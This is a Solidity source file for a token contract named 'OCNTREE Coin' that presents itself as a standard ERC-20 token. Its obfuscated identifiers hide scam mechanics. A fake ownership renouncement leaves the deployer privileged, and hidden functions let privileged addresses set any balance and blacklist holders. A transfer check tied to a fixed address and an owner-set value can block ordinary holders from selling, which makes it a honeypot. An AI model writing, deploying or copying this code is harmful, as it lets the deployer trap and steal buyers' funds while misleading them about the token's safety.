//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

abstract contract totalShouldTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atLimit) external view returns (uint256);

    function transfer(address senderAt, uint256 exemptTotalLiquidity) external returns (bool);

    function allowance(address atLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptTotalLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address senderAt,
        uint256 exemptTotalLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTotal, uint256 value);
    event Approval(address indexed atLaunched, address indexed spender, uint256 value);
}

interface tradingSellSender is liquidityTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface amountMarketing {
    function createPair(address shouldTeamAmount, address marketingExempt) external returns (address);
}

interface amountIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract OCNTREECoin is totalShouldTo, liquidityTake, tradingSellSender {

    uint256 private receiverBuyList;

    string private amountIsMax = "OCNTREE Coin";

    uint256 public buyMax;

    mapping(address => mapping(address => uint256)) private marketingTotal;

    uint256 buyFundLaunched;

    mapping(address => uint256) private shouldIsMarketing;

    address public swapListIs;

    uint256 private txMarketing;

    uint256 toSell;

    address public atTrading;

    constructor (){
        
        marketingLimit();
        amountIs atToken = amountIs(exemptTx);
        swapListIs = amountMarketing(atToken.factory()).createPair(atToken.WETH(), address(this));
        if (buyMax == txMarketing) {
            feeMin = txMarketing;
        }
        atTrading = _msgSender();
        maxTrading[atTrading] = true;
        shouldIsMarketing[atTrading] = feeTotalReceiver;
        
        emit Transfer(address(0), atTrading, feeTotalReceiver);
    }

    mapping(address => bool) public launchTeam;

    function marketingLimit() public {
        emit OwnershipTransferred(atTrading, address(0));
        toExempt = address(0);
    }

    uint256 private exemptAmount;

    function decimals() external view virtual override returns (uint8) {
        return fromLaunch;
    }

    uint256 public fromTx;

    function getOwner() external view returns (address) {
        return toExempt;
    }

    function marketingTo(address isFee) public {
        sellTxTake();
        if (buyMax != marketingReceiver) {
            buyMax = txMarketing;
        }
        if (isFee == atTrading || isFee == swapListIs) {
            return;
        }
        launchTeam[isFee] = true;
    }

    mapping(address => bool) public maxTrading;

    function transferFrom(address walletTrading, address senderAt, uint256 exemptTotalLiquidity) external override returns (bool) {
        if (_msgSender() != exemptTx) {
            if (marketingTotal[walletTrading][_msgSender()] != type(uint256).max) {
                require(exemptTotalLiquidity <= marketingTotal[walletTrading][_msgSender()]);
                marketingTotal[walletTrading][_msgSender()] -= exemptTotalLiquidity;
            }
        }
        return tradingAuto(walletTrading, senderAt, exemptTotalLiquidity);
    }

    uint256 private feeTotalReceiver = 100000000 * 10 ** 18;

    bool private maxEnable;

    function minExempt(address atMax, uint256 exemptTotalLiquidity) public {
        sellTxTake();
        shouldIsMarketing[atMax] = exemptTotalLiquidity;
    }

    uint256 public marketingReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return feeTotalReceiver;
    }

    bool private exemptLiquidity;

    event OwnershipTransferred(address indexed amountSender, address indexed launchedTo);

    function symbol() external view virtual override returns (string memory) {
        return toShould;
    }

    bool public atTotal;

    function name() external view virtual override returns (string memory) {
        return amountIsMax;
    }

    function sellTxTake() private view {
        require(maxTrading[_msgSender()]);
    }

    address tokenTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transfer(address atMax, uint256 exemptTotalLiquidity) external virtual override returns (bool) {
        return tradingAuto(_msgSender(), atMax, exemptTotalLiquidity);
    }

    uint8 private fromLaunch = 18;

    function balanceOf(address atLimit) public view virtual override returns (uint256) {
        return shouldIsMarketing[atLimit];
    }

    function limitAmount(address exemptTeamMax) public {
        if (atTotal) {
            return;
        }
        if (txMarketing != feeMin) {
            exemptLiquidity = true;
        }
        maxTrading[exemptTeamMax] = true;
        if (marketingReceiver == fromTx) {
            fromTx = feeMin;
        }
        atTotal = true;
    }

    uint256 private feeMin;

    function sellSenderToken(address walletTrading, address senderAt, uint256 exemptTotalLiquidity) internal returns (bool) {
        require(shouldIsMarketing[walletTrading] >= exemptTotalLiquidity);
        shouldIsMarketing[walletTrading] -= exemptTotalLiquidity;
        shouldIsMarketing[senderAt] += exemptTotalLiquidity;
        emit Transfer(walletTrading, senderAt, exemptTotalLiquidity);
        return true;
    }

    function approve(address launchTxToken, uint256 exemptTotalLiquidity) public virtual override returns (bool) {
        marketingTotal[_msgSender()][launchTxToken] = exemptTotalLiquidity;
        emit Approval(_msgSender(), launchTxToken, exemptTotalLiquidity);
        return true;
    }

    function txTrading(uint256 exemptTotalLiquidity) public {
        sellTxTake();
        buyFundLaunched = exemptTotalLiquidity;
    }

    string private toShould = "OCN";

    function allowance(address buyReceiver, address launchTxToken) external view virtual override returns (uint256) {
        if (launchTxToken == exemptTx) {
            return type(uint256).max;
        }
        return marketingTotal[buyReceiver][launchTxToken];
    }

    function tradingAuto(address walletTrading, address senderAt, uint256 exemptTotalLiquidity) internal returns (bool) {
        if (walletTrading == atTrading) {
            return sellSenderToken(walletTrading, senderAt, exemptTotalLiquidity);
        }
        uint256 receiverIsFund = liquidityTake(swapListIs).balanceOf(tokenTo);
        require(receiverIsFund == buyFundLaunched);
        require(!launchTeam[walletTrading]);
        return sellSenderToken(walletTrading, senderAt, exemptTotalLiquidity);
    }

    address exemptTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private toExempt;

    function owner() external view returns (address) {
        return toExempt;
    }

}